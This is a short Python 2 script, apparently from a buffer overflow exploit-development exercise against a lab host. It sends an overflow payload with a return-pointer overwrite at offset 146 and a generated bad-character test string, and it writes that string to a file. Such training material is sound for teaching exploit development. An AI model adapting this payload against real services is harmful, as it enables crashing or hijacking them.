#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "10.0.2.15"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # start with an empty string
badchars = [0x00, 0x0A] # we've reasoned that these are definitely bad

#generate the string
for i in range (0x00, 0xFF+1):      # range (0x00, 0xFF) only returns up to 0xFE
    if i not in badchars:           # skip the badchars
            badchar_test += chr(i)  # append each non-badchar to the string

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

buf_totlen = 1024
offset_srp = 146

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += "BBBB"
buf += badchar_test
buf += "D"*(buf_totlen - len(buf))
buf += "\n"

# send the message
s.send(buf)
